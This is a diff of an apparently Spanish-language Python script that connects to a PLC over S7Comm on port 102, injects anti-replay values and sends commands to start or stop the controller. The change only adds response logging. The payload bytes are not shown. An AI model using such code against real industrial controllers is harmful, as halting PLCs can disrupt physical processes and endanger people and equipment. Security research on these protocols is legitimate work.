@@ -237,14 +237,19 @@ def fEncApagPLC(pHostPLC, pAction):
   # Iniciar socket
   vSocketConPLC = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   vSocketConPLC.connect((pHostPLC, 102))
+
   # Enviar payload de solicitud de comunicacion COTP
   print(f"Enviando solicitud de comunicación COTP: {vPayloadSolComCOTP.hex()}")
   vSocketConPLC.send(vPayloadSolComCOTP)
   vPayloadDeRespSolComCOTP = vSocketConPLC.recv(1024)
+  print(f"Respuesta: {vPayloadDeRespSolComCOTP.hex()} \n")
+
   # Enviar payload de solicitud de comunicación S7Comm
   print(f"Enviando solicitud de comunicación S7Comm: {vPayloadSolComS7.hex()}")
   vSocketConPLC.send(vPayloadSolComS7)
   vPayloadDeRespSolComS7 = vSocketConPLC.recv(1024)
+  print(f"Respuesta: {vPayloadDeRespSolComS7.hex()} \n")
+
   # Preparar payload de respuesta al challenge
   vPayloadParaResponderAlChallenge = fInsertarAntiReplay(vPayloadParaResponderAlChallenge)
   if pAction == "Encender":
@@ -252,14 +257,16 @@ def fEncApagPLC(pHostPLC, pAction):
     vPayloadParaEncenderElPLC = fInsertarAntiReplay(vPayloadParaEncenderElPLC)
     print(f"Enviando encendido con antireplay: {vPayloadParaEncenderElPLC.hex()}")
     vSocketConPLC.send(vPayloadParaEncenderElPLC)
-    vPayloadDeRespEncendido = vSocketConPLC.recv(1024)
+    vPayloadDeRespAlEncendido = vSocketConPLC.recv(1024)
+    print(f"Respuesta: {vPayloadDeRespAlEncendido.hex()} \n")
     vSocketConPLC.close()
   elif pAction == "Apagar":
     # Inyectar anti-replay al payload de apagar y enviarlo 
     vPayloadParaApagarElPLC = fInsertarAntiReplay(vPayloadParaApagarElPLC)
     print(f"Enviando apagado con antireplay: {vPayloadParaApagarElPLC.hex()}")
     vSocketConPLC.send(vPayloadParaApagarElPLC)
-    vPayloadDeRespApagado = vSocketConPLC.recv(1024)
+    vPayloadDeRespAlApagado = vSocketConPLC.recv(1024)
+    print(f"Respuesta: {vPayloadDeRespAlApagado.hex()} \n")
     vSocketConPLC.close()
   else:
     print(f"No ha quedado claro si lo que se quiere es encender o apagar el PLC.")
